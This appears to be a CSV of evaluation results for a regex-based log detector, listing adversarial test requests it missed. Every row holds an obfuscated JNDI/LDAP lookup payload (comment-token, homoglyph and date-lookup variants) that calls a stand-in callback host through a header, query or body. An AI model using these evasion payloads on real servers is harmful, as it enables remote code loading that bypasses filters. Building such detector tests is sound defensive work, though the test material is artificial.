model,test_set,id,source,raw_log,normalized_log,true_label,pred_label,score,threshold,error_type,obfuscation_type,explanation
Regex Baseline,adversarial_evasion_test.csv,LS-002110,adversarial_evasion,Request from User-Agent: ${j${/**/}ndi:ldap://callback.local/comment-token} | Method: GET | Host: app.local | Path: /static/app.js,request from user-agent: ${j${/**/}ndi:ldap://callback.local/comment-token} | method: get | host: app.local | path: /static/app.js,1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002111,adversarial_evasion,Request from User-Agent: ${j${/**/}ndi:ldap://callback.local/comment-token},request from user-agent: ${j${/**/}ndi:ldap://callback.local/comment-token},1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002112,adversarial_evasion,Request from User-Agent: PostmanRuntime/7.36.1 | Method: GET | Host: app.local | Path: /static/app.js | X-Api-Version: ${j${/**/}ndi:ldap://callback.local/comment-token},request from user-agent: postmanruntime/7.36.1 | method: get | host: app.local | path: /static/app.js | x-api-version: ${j${/**/}ndi:ldap://callback.local/comment-token},1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002245,adversarial_evasion,GET /?q=${ϳndi:ldap://probe.example.net/greek-j} HTTP/1.1,get /?q=${ϳndi:ldap://probe.example.net/greek-j} http/1.1,1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002246,adversarial_evasion,GET /api/check?debug=${ϳndi:ldap://probe.example.net/greek-j} HTTP/1.1 Host: app.local,get /api/check?debug=${ϳndi:ldap://probe.example.net/greek-j} http/1.1 host: app.local,1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002247,adversarial_evasion,Request from User-Agent: ${ϳndi:ldap://probe.example.net/greek-j} | Method: GET | Host: app.local | Path: /static/app.js,request from user-agent: ${ϳndi:ldap://probe.example.net/greek-j} | method: get | host: app.local | path: /static/app.js,1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002248,adversarial_evasion,Request from User-Agent: ${ϳndi:ldap://probe.example.net/greek-j},request from user-agent: ${ϳndi:ldap://probe.example.net/greek-j},1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002249,adversarial_evasion,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: /search?q=boots | X-Api-Version: ${ϳndi:ldap://probe.example.net/greek-j},request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: /search?q=boots | x-api-version: ${ϳndi:ldap://probe.example.net/greek-j},1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002250,adversarial_evasion,GET /search?q=${ϳndi:ldap://probe.example.net/greek-j} HTTP/1.1 Host: app.local User-Agent: PostmanRuntime/7.36.1,get /search?q=${ϳndi:ldap://probe.example.net/greek-j} http/1.1 host: app.local user-agent: postmanruntime/7.36.1,1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002251,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${ϳndi:ldap://probe.example.net/greek-j},post /search http/1.1 host: app.local body: query=${ϳndi:ldap://probe.example.net/greek-j},1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002252,adversarial_evasion,GET /?q=${ϳndi:ldap://probe.example.net/greek-j} HTTP/1.1,get /?q=${ϳndi:ldap://probe.example.net/greek-j} http/1.1,1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002253,adversarial_evasion,GET /api/check?debug=${ϳndi:ldap://probe.example.net/greek-j} HTTP/1.1 Host: app.local,get /api/check?debug=${ϳndi:ldap://probe.example.net/greek-j} http/1.1 host: app.local,1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002254,adversarial_evasion,Request from User-Agent: ${ϳndi:ldap://probe.example.net/greek-j} | Method: GET | Host: app.local | Path: /search?q=boots,request from user-agent: ${ϳndi:ldap://probe.example.net/greek-j} | method: get | host: app.local | path: /search?q=boots,1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002255,adversarial_evasion,Request from User-Agent: ${ϳndi:ldap://probe.example.net/greek-j},request from user-agent: ${ϳndi:ldap://probe.example.net/greek-j},1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002256,adversarial_evasion,Request from User-Agent: Mozilla/5.0 Chrome/120.0 | Method: GET | Host: app.local | Path: /metrics | X-Api-Version: ${ϳndi:ldap://probe.example.net/greek-j},request from user-agent: mozilla/5.0 chrome/120.0 | method: get | host: app.local | path: /metrics | x-api-version: ${ϳndi:ldap://probe.example.net/greek-j},1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002281,adversarial_evasion,GET /?q=${${date:'jn'}di:ldap://probe.example.net/date-jn} HTTP/1.1,get /?q=${${date:'jn'}di:ldap://probe.example.net/date-jn} http/1.1,1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002282,adversarial_evasion,GET /api/check?debug=${${date:'jn'}di:ldap://probe.example.net/date-jn} HTTP/1.1 Host: app.local,get /api/check?debug=${${date:'jn'}di:ldap://probe.example.net/date-jn} http/1.1 host: app.local,1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002283,adversarial_evasion,Request from User-Agent: ${${date:'jn'}di:ldap://probe.example.net/date-jn} | Method: GET | Host: app.local | Path: /api/products?id=123,request from user-agent: ${${date:'jn'}di:ldap://probe.example.net/date-jn} | method: get | host: app.local | path: /api/products?id=123,1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002284,adversarial_evasion,Request from User-Agent: ${${date:'jn'}di:ldap://probe.example.net/date-jn},request from user-agent: ${${date:'jn'}di:ldap://probe.example.net/date-jn},1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002285,adversarial_evasion,Request from User-Agent: curl/7.88.1 | Method: GET | Host: app.local | Path: /search?q=boots | X-Api-Version: ${${date:'jn'}di:ldap://probe.example.net/date-jn},request from user-agent: curl/7.88.1 | method: get | host: app.local | path: /search?q=boots | x-api-version: ${${date:'jn'}di:ldap://probe.example.net/date-jn},1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002286,adversarial_evasion,GET /search?q=${${date:'jn'}di:ldap://probe.example.net/date-jn} HTTP/1.1 Host: app.local User-Agent: curl/7.88.1,get /search?q=${${date:'jn'}di:ldap://probe.example.net/date-jn} http/1.1 host: app.local user-agent: curl/7.88.1,1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002287,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${${date:'jn'}di:ldap://probe.example.net/date-jn},post /search http/1.1 host: app.local body: query=${${date:'jn'}di:ldap://probe.example.net/date-jn},1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002288,adversarial_evasion,GET /?q=${${date:'jn'}di:ldap://probe.example.net/date-jn} HTTP/1.1,get /?q=${${date:'jn'}di:ldap://probe.example.net/date-jn} http/1.1,1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002289,adversarial_evasion,GET /api/check?debug=${${date:'jn'}di:ldap://probe.example.net/date-jn} HTTP/1.1 Host: app.local,get /api/check?debug=${${date:'jn'}di:ldap://probe.example.net/date-jn} http/1.1 host: app.local,1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002290,adversarial_evasion,Request from User-Agent: ${${date:'jn'}di:ldap://probe.example.net/date-jn} | Method: GET | Host: app.local | Path: /login,request from user-agent: ${${date:'jn'}di:ldap://probe.example.net/date-jn} | method: get | host: app.local | path: /login,1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002291,adversarial_evasion,Request from User-Agent: ${${date:'jn'}di:ldap://probe.example.net/date-jn},request from user-agent: ${${date:'jn'}di:ldap://probe.example.net/date-jn},1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002292,adversarial_evasion,Request from User-Agent: Go-http-client/1.1 | Method: GET | Host: app.local | Path: /static/app.js | X-Api-Version: ${${date:'jn'}di:ldap://probe.example.net/date-jn},request from user-agent: go-http-client/1.1 | method: get | host: app.local | path: /static/app.js | x-api-version: ${${date:'jn'}di:ldap://probe.example.net/date-jn},1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002329,adversarial_evasion,GET /?q=${j${/**/}ndi:ldap://probe.example.net/comment-token} HTTP/1.1,get /?q=${j${/**/}ndi:ldap://probe.example.net/comment-token} http/1.1,1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002330,adversarial_evasion,GET /api/check?debug=${j${/**/}ndi:ldap://probe.example.net/comment-token} HTTP/1.1 Host: app.local,get /api/check?debug=${j${/**/}ndi:ldap://probe.example.net/comment-token} http/1.1 host: app.local,1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002331,adversarial_evasion,Request from User-Agent: ${j${/**/}ndi:ldap://probe.example.net/comment-token} | Method: GET | Host: app.local | Path: /,request from user-agent: ${j${/**/}ndi:ldap://probe.example.net/comment-token} | method: get | host: app.local | path: /,1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002332,adversarial_evasion,Request from User-Agent: ${j${/**/}ndi:ldap://probe.example.net/comment-token},request from user-agent: ${j${/**/}ndi:ldap://probe.example.net/comment-token},1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002333,adversarial_evasion,Request from User-Agent: Go-http-client/1.1 | Method: GET | Host: app.local | Path: /login | X-Api-Version: ${j${/**/}ndi:ldap://probe.example.net/comment-token},request from user-agent: go-http-client/1.1 | method: get | host: app.local | path: /login | x-api-version: ${j${/**/}ndi:ldap://probe.example.net/comment-token},1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002334,adversarial_evasion,GET /search?q=${j${/**/}ndi:ldap://probe.example.net/comment-token} HTTP/1.1 Host: app.local User-Agent: Mozilla/5.0 Chrome/120.0,get /search?q=${j${/**/}ndi:ldap://probe.example.net/comment-token} http/1.1 host: app.local user-agent: mozilla/5.0 chrome/120.0,1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002335,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${j${/**/}ndi:ldap://probe.example.net/comment-token},post /search http/1.1 host: app.local body: query=${j${/**/}ndi:ldap://probe.example.net/comment-token},1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002336,adversarial_evasion,GET /?q=${j${/**/}ndi:ldap://probe.example.net/comment-token} HTTP/1.1,get /?q=${j${/**/}ndi:ldap://probe.example.net/comment-token} http/1.1,1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002337,adversarial_evasion,GET /api/check?debug=${j${/**/}ndi:ldap://probe.example.net/comment-token} HTTP/1.1 Host: app.local,get /api/check?debug=${j${/**/}ndi:ldap://probe.example.net/comment-token} http/1.1 host: app.local,1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002338,adversarial_evasion,Request from User-Agent: ${j${/**/}ndi:ldap://probe.example.net/comment-token} | Method: GET | Host: app.local | Path: /static/app.js,request from user-agent: ${j${/**/}ndi:ldap://probe.example.net/comment-token} | method: get | host: app.local | path: /static/app.js,1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002339,adversarial_evasion,Request from User-Agent: ${j${/**/}ndi:ldap://probe.example.net/comment-token},request from user-agent: ${j${/**/}ndi:ldap://probe.example.net/comment-token},1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002340,adversarial_evasion,Request from User-Agent: curl/7.88.1 | Method: GET | Host: app.local | Path: /home | X-Api-Version: ${j${/**/}ndi:ldap://probe.example.net/comment-token},request from user-agent: curl/7.88.1 | method: get | host: app.local | path: /home | x-api-version: ${j${/**/}ndi:ldap://probe.example.net/comment-token},1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002473,adversarial_evasion,GET /?q=${ϳndi:ldap://lab-callback.example.org/greek-j} HTTP/1.1,get /?q=${ϳndi:ldap://lab-callback.example.org/greek-j} http/1.1,1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002474,adversarial_evasion,GET /api/check?debug=${ϳndi:ldap://lab-callback.example.org/greek-j} HTTP/1.1 Host: app.local,get /api/check?debug=${ϳndi:ldap://lab-callback.example.org/greek-j} http/1.1 host: app.local,1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002475,adversarial_evasion,Request from User-Agent: ${ϳndi:ldap://lab-callback.example.org/greek-j} | Method: GET | Host: app.local | Path: /home,request from user-agent: ${ϳndi:ldap://lab-callback.example.org/greek-j} | method: get | host: app.local | path: /home,1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002476,adversarial_evasion,Request from User-Agent: ${ϳndi:ldap://lab-callback.example.org/greek-j},request from user-agent: ${ϳndi:ldap://lab-callback.example.org/greek-j},1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002477,adversarial_evasion,Request from User-Agent: Java/11.0.13 | Method: GET | Host: app.local | Path: /home | X-Api-Version: ${ϳndi:ldap://lab-callback.example.org/greek-j},request from user-agent: java/11.0.13 | method: get | host: app.local | path: /home | x-api-version: ${ϳndi:ldap://lab-callback.example.org/greek-j},1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002478,adversarial_evasion,GET /search?q=${ϳndi:ldap://lab-callback.example.org/greek-j} HTTP/1.1 Host: app.local User-Agent: Java/11.0.13,get /search?q=${ϳndi:ldap://lab-callback.example.org/greek-j} http/1.1 host: app.local user-agent: java/11.0.13,1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002479,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${ϳndi:ldap://lab-callback.example.org/greek-j},post /search http/1.1 host: app.local body: query=${ϳndi:ldap://lab-callback.example.org/greek-j},1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002480,adversarial_evasion,GET /?q=${ϳndi:ldap://lab-callback.example.org/greek-j} HTTP/1.1,get /?q=${ϳndi:ldap://lab-callback.example.org/greek-j} http/1.1,1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002481,adversarial_evasion,GET /api/check?debug=${ϳndi:ldap://lab-callback.example.org/greek-j} HTTP/1.1 Host: app.local,get /api/check?debug=${ϳndi:ldap://lab-callback.example.org/greek-j} http/1.1 host: app.local,1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002482,adversarial_evasion,Request from User-Agent: ${ϳndi:ldap://lab-callback.example.org/greek-j} | Method: GET | Host: app.local | Path: /static/app.js,request from user-agent: ${ϳndi:ldap://lab-callback.example.org/greek-j} | method: get | host: app.local | path: /static/app.js,1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002483,adversarial_evasion,Request from User-Agent: ${ϳndi:ldap://lab-callback.example.org/greek-j},request from user-agent: ${ϳndi:ldap://lab-callback.example.org/greek-j},1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002484,adversarial_evasion,Request from User-Agent: curl/7.88.1 | Method: GET | Host: app.local | Path: /home | X-Api-Version: ${ϳndi:ldap://lab-callback.example.org/greek-j},request from user-agent: curl/7.88.1 | method: get | host: app.local | path: /home | x-api-version: ${ϳndi:ldap://lab-callback.example.org/greek-j},1,0,0.45,0.7,false_negative_unknown_obfuscation,homoglyph_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002509,adversarial_evasion,GET /?q=${${date:'jn'}di:ldap://lab-callback.example.org/date-jn} HTTP/1.1,get /?q=${${date:'jn'}di:ldap://lab-callback.example.org/date-jn} http/1.1,1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002510,adversarial_evasion,GET /api/check?debug=${${date:'jn'}di:ldap://lab-callback.example.org/date-jn} HTTP/1.1 Host: app.local,get /api/check?debug=${${date:'jn'}di:ldap://lab-callback.example.org/date-jn} http/1.1 host: app.local,1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002511,adversarial_evasion,Request from User-Agent: ${${date:'jn'}di:ldap://lab-callback.example.org/date-jn} | Method: GET | Host: app.local | Path: /,request from user-agent: ${${date:'jn'}di:ldap://lab-callback.example.org/date-jn} | method: get | host: app.local | path: /,1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002512,adversarial_evasion,Request from User-Agent: ${${date:'jn'}di:ldap://lab-callback.example.org/date-jn},request from user-agent: ${${date:'jn'}di:ldap://lab-callback.example.org/date-jn},1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002513,adversarial_evasion,Request from User-Agent: Java/11.0.13 | Method: GET | Host: app.local | Path: /static/app.js | X-Api-Version: ${${date:'jn'}di:ldap://lab-callback.example.org/date-jn},request from user-agent: java/11.0.13 | method: get | host: app.local | path: /static/app.js | x-api-version: ${${date:'jn'}di:ldap://lab-callback.example.org/date-jn},1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002514,adversarial_evasion,GET /search?q=${${date:'jn'}di:ldap://lab-callback.example.org/date-jn} HTTP/1.1 Host: app.local User-Agent: Java/11.0.13,get /search?q=${${date:'jn'}di:ldap://lab-callback.example.org/date-jn} http/1.1 host: app.local user-agent: java/11.0.13,1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002515,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${${date:'jn'}di:ldap://lab-callback.example.org/date-jn},post /search http/1.1 host: app.local body: query=${${date:'jn'}di:ldap://lab-callback.example.org/date-jn},1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002516,adversarial_evasion,GET /?q=${${date:'jn'}di:ldap://lab-callback.example.org/date-jn} HTTP/1.1,get /?q=${${date:'jn'}di:ldap://lab-callback.example.org/date-jn} http/1.1,1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002517,adversarial_evasion,GET /api/check?debug=${${date:'jn'}di:ldap://lab-callback.example.org/date-jn} HTTP/1.1 Host: app.local,get /api/check?debug=${${date:'jn'}di:ldap://lab-callback.example.org/date-jn} http/1.1 host: app.local,1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002518,adversarial_evasion,Request from User-Agent: ${${date:'jn'}di:ldap://lab-callback.example.org/date-jn} | Method: GET | Host: app.local | Path: /metrics,request from user-agent: ${${date:'jn'}di:ldap://lab-callback.example.org/date-jn} | method: get | host: app.local | path: /metrics,1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002519,adversarial_evasion,Request from User-Agent: ${${date:'jn'}di:ldap://lab-callback.example.org/date-jn},request from user-agent: ${${date:'jn'}di:ldap://lab-callback.example.org/date-jn},1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002520,adversarial_evasion,Request from User-Agent: curl/7.88.1 | Method: GET | Host: app.local | Path: / | X-Api-Version: ${${date:'jn'}di:ldap://lab-callback.example.org/date-jn},request from user-agent: curl/7.88.1 | method: get | host: app.local | path: / | x-api-version: ${${date:'jn'}di:ldap://lab-callback.example.org/date-jn},1,0,0.45,0.7,false_negative_unknown_obfuscation,semantic_lookup_jndi,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002557,adversarial_evasion,GET /?q=${j${/**/}ndi:ldap://lab-callback.example.org/comment-token} HTTP/1.1,get /?q=${j${/**/}ndi:ldap://lab-callback.example.org/comment-token} http/1.1,1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002558,adversarial_evasion,GET /api/check?debug=${j${/**/}ndi:ldap://lab-callback.example.org/comment-token} HTTP/1.1 Host: app.local,get /api/check?debug=${j${/**/}ndi:ldap://lab-callback.example.org/comment-token} http/1.1 host: app.local,1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002559,adversarial_evasion,Request from User-Agent: ${j${/**/}ndi:ldap://lab-callback.example.org/comment-token} | Method: GET | Host: app.local | Path: /login,request from user-agent: ${j${/**/}ndi:ldap://lab-callback.example.org/comment-token} | method: get | host: app.local | path: /login,1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002560,adversarial_evasion,Request from User-Agent: ${j${/**/}ndi:ldap://lab-callback.example.org/comment-token},request from user-agent: ${j${/**/}ndi:ldap://lab-callback.example.org/comment-token},1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002561,adversarial_evasion,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: /static/app.js | X-Api-Version: ${j${/**/}ndi:ldap://lab-callback.example.org/comment-token},request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: /static/app.js | x-api-version: ${j${/**/}ndi:ldap://lab-callback.example.org/comment-token},1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
Regex Baseline,adversarial_evasion_test.csv,LS-002562,adversarial_evasion,GET /search?q=${j${/**/}ndi:ldap://lab-callback.example.org/comment-token} HTTP/1.1 Host: app.local User-Agent: Mozilla/5.0 Chrome/120.0,get /search?q=${j${/**/}ndi:ldap://lab-callback.example.org/comment-token} http/1.1 host: app.local user-agent: mozilla/5.0 chrome/120.0,1,0,0.45,0.7,false_negative_unknown_obfuscation,comment_injection,Model score disagreed with the dataset label at the evaluation threshold.
